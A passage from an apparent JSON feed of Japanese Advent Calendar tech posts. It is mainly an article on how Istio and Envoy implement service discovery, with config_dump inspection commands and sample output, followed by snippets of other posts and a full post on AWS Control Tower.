に知見を記録しており、はてなブログはデビュー戦となります。最近の業務で、オンプレとAWS上のIstio⛵️をひたすら子守りしています。今回は、子守りの前提知識の復習もかねて、Istioのサービス間通信を実現するサービスディスカバリーの仕組みを記事で解説しました。Istioの機能の1つであるサービスディスカバリーは、その仕組みの多くをEnvoyに頼っているため、合わせてEnvoyの仕組みも説明します。それでは、もりもり布教していきます\uD83D\uDE1702. サービスディスカバリーについてマイクロサービスアーキテクチャにおけるサービスディスカバリーサービスディスカバリーとは平易な言葉で言い換えると サービス間通信 です。マイクロサービスアーキテクチャでは、マイクロサービスからマイクロサービスにリクエストを送信する場面があります。サービスディスカバリーとは、宛先マイクロサービスの宛先情報 (例：IPアドレス、完全修飾ドメイン名など) を検出し、送信元マイクロサービスが宛先マイクロサービスにリクエストを継続的に送信可能にする仕組みのことです。なぜサービスディスカバリーが必要なのかそもそも、なぜサービスディスカバリーが必要なのでしょうか。マイクロサービスアーキテクチャでは、システムの信頼性 (定められた条件下で定められた期間にわたり、障害を発生させることなく実行する程度) を担保するために、マイクロサービスのインスタンスの自動スケーリングを採用します。この時、自動スケーリングのスケールアウトでマイクロサービスが増加するたびに、各インスタンスには新しい宛先情報が割り当てられてしまいます。また、マイクロサービスが作り直された場合にも、宛先情報は更新されてしまいます。このように、たとえインスタンスの宛先情報が更新されたとしても、インスタンスへのリクエストに失敗しない仕組みが必要です。サービスディスカバリーの要素サービスディスカバリーの仕組みは、次の要素からなります。名前解決は、DNSベースのサービスディスカバリー (例：CoreDNS + Service + kube-proxyによるサービスディスカバリー) で必要となり、Istioでは使いません。そのため、本記事では言及しないこととします\uD83D\uDE47\uD83C\uDFFB‍ 要素                    責務                                                              送信元マイクロサービス  リクエストを送信する。                                            宛先マイクロサービス    リクエストを受信する。                                            サービスレジストリ      宛先マイクロサービスの宛先情報を保管する。                        ロードバランサー        宛先マイクロサービスのインスタンスにロードバランシングする。      名前解決                宛先マイクロサービスへのリクエスト送信時に、名前解決可能にする。 サービスディスカバリーのパターンサービスディスカバリーのパターンとはサービスディスカバリーの実装方法にはいくつか種類があります。Istioのサービスディスカバリーは、このうちのサーバーサイドパターンを実装したものになります。サーバーサイドパターン送信元マイクロサービスから、問い合わせとロードバランシングの責務が切り離されています。送信元マイクロサービスは、ロードバランサーにリクエストを送信します。ロードバランサーは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、またリクエストをロードバランシングする責務を担っています\uD83D\uDCAA\uD83C\uDFFB(例) Istio、Linkerd、CoreDNS、AWS ALBなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Server-side service discoveryクライアントサイドパターン通信の送信元マイクロサービスは、宛先マイクロサービスの場所をサービスレジストリに問い合わせ、さらにロードバランシングする責務を担います。(例) NetflixのEureka、kube-proxyなどCloud Native Patterns: Designing change-tolerant software (English Edition)Pattern: Client-side service discoveryService Discovery in Kubernetes: Combining the Best of Two Worlds03. Istioのサービスディスカバリーの仕組みIstioが実装するサービスメッシュには、サイドカープロキシメッシュとアンビエントメッシュがあり、今回はサイドカープロキシメッシュのサービスディスカバリーを取り上げます。Istioのサービスディスカバリーは、discoveryコンテナとistio-proxyコンテナが軸となり、サーバーサイドパターンのサービスディスカバリーを実装します。全体像(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47istio-proxyコンテナは、サービスレジストリへの問い合わせと、ロードバランシングする責務を担っていることに注目してください。(1) kube-apiserverによる宛先情報保管kube-apiserverは、Pod等の宛先情報をetcd等に保管します。これは、Kubernetesの通常の仕組みです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナは、kube-apiserverからPod等の宛先情報を取得し、自身に保管します。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナは、discoveryコンテナからPod等の宛先情報を双方向ストリーミングRPCで取得します。(4) istio-proxyコンテナによるリクエスト受信送信元マイクロサービスがリクエストを送信します。サーバーサイドパターンでの責務通り、送信元マイクロサービスはロードバランサー (ここではistio-proxyコンテナ) にリクエストを送信します。この時、送信元マイクロサービスがistio-proxyコンテナに直接的にリクエストを送信しているというよりは、iptablesがistio-proxyコンテナにリクエストをリダイレクトします。istio-proxyコンテナこれを受信します。(5) istio-proxyコンテナによるロードバランシングistio-proxyコンテナは、リクエストをロードバランシングし、また宛先Podに送信します。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blogdiscoveryコンテナの仕組み全体像の中から、discoveryコンテナを詳しく見てみましょう。discoveryコンテナは、別名Istiodと呼ばれています。XDS-APIというエンドポイントを公開しており、XDS-APIのうち、サービスディスカバリーに関係するAPIは以下の通りです。今回は詳しく言及しませんが、istio-proxyコンテナがHTTPSリクエストを処理するために、証明書を配布するためのSDS-APIもあります。 APIの種類  説明                                                   LDS-API    Envoyのリスナーを取得できる。                          RDS-API    Envoyのルートを取得できる。                            CDS-API    Envoyのクラスターを取得できる。                        EDS-API    Envoyのエンドポイントできる。                          ADS-API    各XDS-APIから取得できる宛先情報を整理して取得できる。 Istio in Action(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得XDS-APIとistio-proxyコンテナの間では、gRPCの双方向ストリーミングRPCの接続が確立されています。そのため、istio-proxyコンテナからのリクエストに応じて宛先情報を返却するだけでなく、リクエストがなくとも、XDS-APIからもistio-proxyコンテナに対して宛先情報を送信します。XDS-APIのエンドポイントがいくつかあり、各エンドポイントから宛先情報を取得できます。一方で、各エンドポイントからバラバラに宛先情報を取得すると、Envoy上でこれを整理する時に、宛先情報のバージョンの不整合が起こる可能性があります。そのため、Istioは実際にはADS-APIを使用して宛先情報を取得します。istio-proxyコンテナの仕組み全体像の中から、istio-proxyコンテナを詳しく見てみましょう。Istio in ActionJimmy SongTech-赵化冰的博客 | Zhaohuabing Blog(1) kube-apiserverによる宛先情報保管kube-apiserverによる宛先情報保管 と同じです。(2) discoveryコンテナによる宛先情報保管discoveryコンテナによる宛先情報保管 と同じです。(3) istio-proxyコンテナによる宛先情報取得istio-proxyコンテナでは、pilot-agentとEnvoyが稼働しています。先ほどistio-proxyコンテナは、双方向ストリーミングRPCでADS-APIから宛先情報を取得すると説明しました。厳密にはEnvoyが、pilot-agentを介して、ADS-APIから双方向ストリーミングRPCで宛先情報を取得します。(4) istio-proxyコンテナによるリクエスト受信istio-proxyコンテナによるリクエスト受信 と同じです。(5) istio-proxyコンテナによるリクエスト受信EnvoyはADS-APIから取得した宛先情報に基づいて、宛先マイクロサービスのインスタンスにロードバランシングします。04. istio-proxyコンテナ内のEnvoyの仕組み全体像EnvoyがADS-APIから取得した宛先情報を見ていく前に、Envoyの処理の流れを解説します。istio-proxyコンテナ内のEnvoyでは、以下の仕組みでHTTPリクエストを処理します。(1) 〜 (6) の全体像は、以下の通りです\uD83D\uDC47Istio in Action (English Edition)Istio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and ObserveArchitecture Analysis of Istio: The Most Popular Service Mesh Project - Alibaba Cloud Community(1) 送信元マイクロサービスからリクエスト受信istio-proxyコンテナは、送信元マイクロサービスからリクエストを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先情報 (例：宛先IPアドレス、ポート番号、パス、ホストなど) に応じてリスナーを選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくルートを選びます。▶ TCPリクエストを処理する場合についてDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPT(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくクラスターを選びます。(5) Envoyによるエンドポイント選択Envoyは、クラスターに紐づくエンドポイントを選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントに対応するインスタンスにリクエストを送信します。Envoyで確認した宛先情報を\uD83D\uDC46に当てはめて見ていくことにしましょう。EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイント実際にEnvoyに登録されている宛先情報は、istio-proxyコンテナ自体のlocalhost:15000/config_dumpからJSON形式で取得できます。もしお手元にIstioがある場合は、Envoyにどんな宛先情報が登録されているか、Envoyを冒険してみてください。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump\\" | yq -P▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dリスナー▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_listeners}から確認できます。ここでは、foo-pod内でbar-podのリスナーを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -P▼ 結果以下を確認できました。宛先IPアドレスや宛先ポート番号に応じてリスナーを選べるようになっており、ここでは<任意のIPアドレス>:50002。リスナーに紐づくルートの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener    # リスナー名    name: 0.0.0.0_50002    active_state:      version_info: 2022-11-24T12:13:05Z/468      listener:        \\"@type\\": type.googleapis.com/envoy.config.listener.v3.Listener        name: 0.0.0.0_50002        address:          socket_address:            # 受信したパケットのうちで、宛先IPアドレスでフィルタリング            address: 0.0.0.0            # 受信したパケットのうちで、宛先ポート番号でフィルタリング            port_value: 50002        filter_chains:          - filter_chain_match:              transport_protocol: raw_buffer              application_protocols:                - http/1.1                - h2c            filters:              - name: envoy.filters.network.http_connection_manager                typed_config:                  \\"@type\\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager                  stat_prefix: outbound_0.0.0.0_50001                  rds:                    config_source:                      ads: {}                      initial_fetch_timeout: 0s                      resource_api_version: V3                    # 本リスナーに紐づくルートの名前                    route_config_name: 50002  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationルート▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_route_configs}から確認できます。ここでは、foo-pod内でbar-podのルートを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。リスナーを取得した時に確認できたルートの名前リクエストのパスやHostヘッダーに応じてルートを選べるようになっているルートに紐づくクラスターの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig    version_info: 2022-11-24T12:13:05Z/468    route_config:      \\"@type\\": type.googleapis.com/envoy.config.route.v3.RouteConfiguration      # ルートの名前      name: 50002      virtual_hosts:        - name: bar-service.bar-namespace.svc.cluster.local:50002          # ホストベースルーティング          domains:            - bar-service.bar-namespace.svc.cluster.local            - bar-service.bar-namespace.svc.cluster.local:50002            - bar-service            - bar-service:50002            - bar-service.bar-namespace.svc            - bar-service.bar-namespace.svc:50002            - bar-service.bar-namespace            - bar-service.bar-namespace:50002            - 172.16.0.2            - 172.16.0.2:50002          routes:            - match:                # パスベースルーティング                prefix: /              route:                # 本ルートに紐づくクラスターの名前                cluster: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local                timeout: 0s                retry_policy:                  retry_on: connect-failure,refused-stream,unavailable,cancelled,retriable-status-codes                  num_retries: 2                  retry_host_predicate:                    - name: envoy.retry_host_predicates.previous_hosts                  host_selection_retry_max_attempts: \\"5\\"                  retriable_status_codes:                    - 503                max_stream_duration:                  max_stream_duration: 0s                  grpc_timeout_header_max: 0s              decorator:                operation: bar-service.bar-namespace.svc.cluster.local:50002/*  ...  - \'@type\': type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationクラスター▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?resource={dynamic_active_clusters}から確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。ルートを取得した時に確認できたクラスターの名前クラスターに紐づくエンドポイントの親名configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster    version_info: 2022-11-24T12:13:05Z/468    cluster:      \\"@type\\": type.googleapis.com/envoy.config.cluster.v3.Cluster      # クラスターの名前      name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local      type: EDS      eds_cluster_config:        eds_config:          ads: {}          initial_fetch_timeout: 0s          resource_api_version: V3        # 本クラスターに紐づくエンドポイントの親名        service_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationエンドポイント▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?include_edsから確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。クラスターを取得した時に確認できたエンドポイントの親名bar-podのインスタンスが3個あるため、3個のエンドポイントがありますconfigs:  dynamic_endpoint_configs:    - endpoint_config:        \\"@type\\": type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment        # エンドポイントの親名        cluster_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local        endpoints:          - locality:              region: ap-northeast-1              zone: ap-northeast-1a            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.1                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.2                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.3                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1        policy:          overprovisioning_factor: 140    ...    - endpoint_config:    ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentation▶ Envoyの負荷分散方式についてload_balancing_weightキー値が等しい場合、EnvoyはP2Cアルゴリズムに基づいてロードバランシングします\uD83D\uDC4DEnvoyの処理の流れのまとめ確認できた宛先情報を、Envoyの処理の流れに当てはめてみました。(1) 送信元マイクロサービスからリクエスト受信送信元マイクロサービスは、宛先マイクロサービス (<任意のIP>/:50002) にリクエストを送信します。サイドカーコンテナのistio-proxyコンテナはこれを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先 (IPアドレス、ポート番号、パス) からPodのリスナー (0.0.0.0_50002) を選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくPodのルート (50002) を選びます。(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのクラスター (outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local) を選びます。(5) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのインスタンスのエンドポイント (11.0.0.X/:50002) を選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントの宛先にPodのリクエストを送信します。サービスディスカバリーの冒険は以上です⛵05. おわりにIstioの機能の1つである『サービスディスカバリー』の仕組みを、Envoyを交えながらもりもり布教しました。愛が溢れてしまいました。Istioの機能を1つとっても、複雑な仕組みで実現していることがお分かりいただけたかと思います。Istioありがとう\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F謝辞3-shake SRE Tech Talk での発表前後に、以下の方々に発表内容について助言をいただきました。@ido_kara_deru さん@yosshi_ さん@yteraoka さん(アルファベット順)また、今回の 3-shake Advent Calender 2022 は、以下の方々に企画いただきました。@jigyakkuma_ さん@nwiizo さん(アルファベット順)皆様に感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'ReillyAmazon","isoDate":"2022-12-24T21:00:00.000Z","dateMiliSeconds":1671915600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Linkerdにおけるトラフィック制御","link":"https://zenn.dev/kimitsu/articles/linkerd-traffic-control","contentSnippet":"Linkerd は Kubernetes 用の軽量サービスメッシュです。複雑な設定なしにセキュリティ、可観測性、信頼性をクラスタに追加できるのが特徴とされています。また CNCF では Graduated Project としてホストされています。（ちなみにサービスメッシュのデファクトスタンダードとされている Istio は CNCF では Incubating Project です。）Linkerd の機能の 1 つにトラフィックの制御があります。これはある Pod にリクエストを投げられるのは特定の Pod だけというような制限をかけるためのものです。トラフィック制御の設...","isoDate":"2022-12-24T12:56:07.000Z","dateMiliSeconds":1671886567000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Steam Deck に Windows を入れたい方の参考になれば...!","link":"https://qiita.com/tozastation/items/a57df36a369b5425795a","contentSnippet":"この記事は 3-shake Advent Calendar 2022 の24日目の記事です。はじめに年末、しかもクリスマスということで散財させていただきました。初めまして、戸澤といいます。日常では「たらこさん」「サーモンさん」と呼ばれています。日々の業務としては、3...","isoDate":"2022-12-24T08:36:33.000Z","dateMiliSeconds":1671870993000,"authorName":"tozastation","authorId":"tozastation"},{"title":"KubernetesのマニフェストをCIで検査する方針を考える","link":"https://zenn.dev/tayusa/articles/ad9fafa197888b","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 17日目の記事です。https://qiita.com/advent-calendar/2022/3-shake 概要以下の気持ちでKubernetesのマニフェストを検査するツールを選定しました。ベストプラクティスに則りたい細かなレビューの手間を省きたいセキュリティリスクを排除したい保守するのが大変なので出来るだけ自分でポリシーは書きたくない。書くとしても書きやすい方法で記述したい 検査ツールの選定以下のツールからカテゴリ別に選定することにしました。スキーマ検査kubeval...","isoDate":"2022-12-17T03:48:50.000Z","dateMiliSeconds":1671248930000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"CloudWatch Logs のログストリームごとのサイズを取得する","link":"https://zenn.dev/toshikish/articles/684e4d7ed4532f","contentSnippet":"動機Amazon CloudWatch Logs のログストリームごとのサイズを知りたいことがありました。たとえば Amazon EKS クラスタを立ち上げて Fluentd または Fluent Bit でログを CloudWatch Logs に送る設定をすると，Pod のログは単一のロググループ（デフォルトでは /aws/containerinsights/Cluster_Name/application）に集約されます。https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Container-Ins...","isoDate":"2022-12-16T08:57:33.000Z","dateMiliSeconds":1671181053000,"authorName":"toshikish","authorId":"toshikish"},{"title":"エンジニア市場拡大のための「憧れの職業」の重要性に関する緒論","link":"https://qiita.com/skikkh/items/21c270c7ff7a942dc5f7","contentSnippet":"はじめに今回、4年ぶりにQiitaに記事を投稿させていただく。ひょんなきっかけ1で私は、自身が勤めるスリーシェイクのアドベントカレンダーである3-shake Advent Calendar 2022の16日目を担当することとなった。本投稿がそれに当たる。私は、現在3...","isoDate":"2022-12-16T02:21:05.000Z","dateMiliSeconds":1671157265000,"authorName":"skikkh","authorId":"skikkh"},{"title":"⛵️ Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://speakerdeck.com/hiroki_hasegawa/istioniyorusahisuteisukaharinoshi-zu-mi","contentSnippet":"『3-shake SRE Tech Talk』の登壇資料です\\r\\rIstioのサービスディスカバリーの仕組みについて、Envoyを交えながら解説しました。\\r\\rスライドでは仕組みの詳細を解説できませんでしたので、ぜひ元記事 (Istioのサービス間通信を実現するサービスディスカバリーの仕組み) も参照ください\uD83D\uDC4D\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1603344099368570880","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Play with \uD83D\uDC10 in Kubernetes","link":"https://speakerdeck.com/kyohmizu/play-with-in-kubernetes","contentSnippet":"3-shake SRE Tech Talk 2022 クリスマス直前会！の資料です。\\rhttps://3-shake.connpass.com/event/267080/","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Istio⛵️】\\"3-shake SRE Tech Talk\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/15/025523","contentSnippet":"発表スライドから得られる知識イベント名発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Istioのサービスディスカバリーの仕組みについてみんな！スライドぜってぇ見てくれよな！イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『Istioのサービス間通信を実現するサービスディスカバリーの仕組み』ていうテーマで、 3-shake SRE Tech Talk に登壇したぞ！本日の発表資料です！⛵️#SRETThttps://t.co/0MKMYVa77u— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 15, 2022 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2022-12-15T03:00:00.000Z","dateMiliSeconds":1671073200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"時間がない人のための AWS Solutions Architect - Professional 勉強法","link":"https://zenn.dev/toshikish/articles/06d85a2db79f4d","contentSnippet":"難度が高くしっかりとした準備が必要な AWS SA Pro 試験を申し込んだものの，残された時間があまりないという方向けに書いた勉強法の記事です。 試験の概略 特徴長文の選択式問題が75問出題され，それを180分で解くという長丁場な試験です。ざっくり1問あたり2分24秒かけられます。75問もあり，1問に複数のサービスを関連させられるので，AWS が重点的に問いたいサービス・テーマはもれなく出現します。AWS を使った2年以上の実務経験が想定されていますが，たいていの場合，実務で扱うサービスは主要なサービスに限られ，触ったこともないサービスが多く出題されます。そのため，確...","isoDate":"2022-12-12T10:46:25.000Z","dateMiliSeconds":1670841985000,"authorName":"toshikish","authorId":"toshikish"},{"title":"AWS Control Towerを調べる","link":"https://blog.masasuzu.net/entry/2022/12/10/204957","contentSnippet":"これは  3-shake Advent Calendar 2022 10日目の記事です仕事の中でAWSで複数のアカウントを管理したいという要件あり、その中でAWS Control Towerが使えないかなと調べたものをざっくりと書いていきます。AWS Control TowerとはAWS Control TowerとはLanding Zoneを実装するためのAWSのマネージドサービスです。そもそもLanding Zoneって何って話になりますね。Landing Zoneとはセキュリティとコンプライアンスのベストプラクティスに基づきアーキテクチャ設計とマルチアカウント環境を管理する仕組みを指します。Landing Zoneは、下記機能から構成されます。アカウントの発行必要な初期設定の済んだアカウントを作成管理用権限の発行対象アカウントを管理するための権限を作成AWS ログの集約監査用ログをセキュアに一元保存ガードレールの設置実施してはいけない操作の禁止危険な設定の監視Landing Zoneの実装方法AWS Control TowerAWSサービスとして提供される Landing Zoneです。容易に利用可能ですが、カスタマイズするには制限があります。(必須のガードレールを外せなかったり)主にこれからAWSを利用する場合に利用できます。既存アカウントにも適用可能です。独自実装の Landing Zone自組織で独自実装するパターンです。自組織の方針に従って自由にカスタマイズできるのが強みです。ただし、自由にカスタマイズはできますが、自身でメンテナンスしないといけないので、コストはかかります。主に既存アカウントに適用する場合に利用できます。自組織でアカウント発行の仕組みや管理の仕組みができあがってる場合などです。そもそもなんでマルチアカウントにするのかAWSをマルチアカウントにする観点として以下のものが考えられます。環境の分離開発、テスト、本番を分離することによるセキュリティおよび統制の確保請求の分離部門やシステム単位でのコスト明確化権限の分離部門間での権限分離およびアカウントへの権限移譲複雑性の分離アカウントの目的を明確に絞ることで、構成がシンプルになるAWS Organizationsだけでもできることマルチアカウント管理するだけならOrganizationだけでもある程度はできます。むしろAWS Control TowerはOrganizationの機能を利用しています。複数AWSアカウントの一元管理Organization Unit(OU)の作成複数アカウントのグルーピング化AWSアカウントの発行Service Control Policyの作成、OUへの適用複数アカウントの一括請求AWS Control Towerだと何ができるのかControl Towerで提供される機能として以下のものがあります。Landing Zoneの提供AWS Organizationを使用してマルチアカウントを作成デフォルトでSandbox、SecurityのOUを作成AWS IAM アイデンティティセンターを利用したID管理を提供Account FactoryAWSアカウントのプロビジョニングの自動化設定可能なテンプレートを提供CloudTrailとConfigログの保存Log Archiveアカウント内のS3バケットに一元的に保存されるガードレールの提供必須と任意の観点の2種類と予防的と発見的の2種類の組み合わせがありControl Towerにより管理下のアカウントに適用される参考: ガードレールの仕組み予防的ガードレール(Service Control Policy)禁止されたアクションの実行が拒否される仕組みControl Tower管理下のアカウントは必須の予防的ガードレールで禁止されているアクションが不可能発見的ガードレール(Config)特定のイベントが発生したときにCloudTrailに記録される仕組みダッシュボードOUやアカウント、ガードレール違反などが一覧表示できるAWS Control TowerではできないことAWS Control Towerでは提供されてない機能もあります。GuardDutyやSecurity Hubなどのセキュリティ機能を組織全体適用するにはOrganizationsの機能を利用する必要があります。AWS Control Towerの注意点、制約事項いろいろ資料を見てみてこの辺注意が必要かなという点を書いていきます。注意点既存アカウントの Control Tower への受入処理時にエラーになった場合、スタックセット内で自動実行される作業の一部手作業が必要になる参考:トラブルシューティング - AWS Control Tower独自ガードレールの追加は可能だが、容易ではない。必須ガードレールを外せない参考:必須のガードレール - AWS Control Tower各種セキュリティー機能は自動で有効化されないため、Control Towerの範囲外のセキュリティ機能は Control Tower の機能の外で管理が必要になる範囲内の機能: Config, CloudTrail, SCP範囲外の機能: GuardDuty, Security Hub, IAM Access Analyzer, DetectiveControl Tower 未対応リージョンを使用している場合、Control Tower適用リージョンと適用外リージョンが混在して管理が煩雑になる大阪リージョン未対応なのでマルチリージョンを考えるときに注意Control Towerはマネージドサービスであるが追加機能によっては手動バージョンアップ が必要になるケースがある参考: ランディングゾーンを更新する - AWS Control Tower参考: 更新について - AWS Control Towerログアーカイブアカウントで独自のログバケットを作成可能だが、非推奨参考: ランディングゾーンのセットアップに関する管理上のヒントリージョンの使用を制限する SCP の併用に注意が必要参考: AWS Control Tower リソースの作成および変更に関するガイダンスIaC との境界の検討が必要アカウント発行に関してはControl Tower(Account Factory)で手動で行い、その後のアカウント設定はTerraformで行うなどAccount Factory for Terraformを利用することでAWSアカウント発行は可能参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニングどこまでTerraformで対応するかは別途検討が必要制限とクォータS３へのログの保存期間は、最大15年間保存可能(最近アップデートされた)Security OU の共有アカウントの E メールアドレスは変更可能だが、これらの変更を AWS Control Tower コンソールで確認するには、Landing Zone を更新する必要があるAWS Control Tower Landing zone の OU には、OU あたり5個のSCPの制限が適用される300超のアカウントを持つ既存の OU は、AWS Control Tower に登録することはできない300を超える場合はOUを分ける必要があるOUのネストは２段階まで、孫OUを持つことはできない参考: AWS Organizations における組織単位のベストプラクティスAWS Control Towerを使うべきなのかマルチアカウントを展開していくのであれば、AWSのベストプラクティスに乗れるので、使用するのが無難です。ただし、独自のLanding Zoneをすでに構築しており、Account Factoryの仕組みも独自で構築できているのであれば、移行コストを鑑みてそのままでも問題ないです。必須の予防的ガードレールが許容できない、OUなどの制限にひっかるなどの運用上の制約がある場合は使えないので、組織のポリシーを見直すか、独自でLanding Zoneを作るかを考える必要があります。発展もっと調査したかったが、時間が足りなかったことや今後調べたいことです。コンソールからAccount Factory実行するとService Catalogの設定項目がありますが、Service Catalog自体の理解不足でどう扱うのかが把握できてないのでこの辺調べたいです。Account Factory for Terraform(AFT)を使うとアカウント発行そのものもIaC化できるので試したい。参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニング参考: ついにControl Towerのアカウント発行からカスタマイズまでIaC対応！Account Factory for Terraform (AFT)が新登場 #reinvent | DevelopersIOCustomization for Control Tower(CfCT)を使うとアカウント発行のイベントをトリガーにCloudFormationを実行できるので、これも実験したい。参考: AWS Control Tower のカスタマイズ (CfCT) の概要 - AWS Control Tower参考: Control Towerカスタマイズソリューション(CfCT)を使ってガードレールとCloudFormationを自動展開してみた | DevelopersIOまとめControl Towerについて調べたことを書いていきました。実運用自体はまだしてないので、これから触ってみて知見が溜まってきたらまたそれも共有できたらと思います。","isoDate":"2022-12-10T11:49:57.000Z","dateMiliSeconds":1670672997000,"authorName":"SUZUKI, 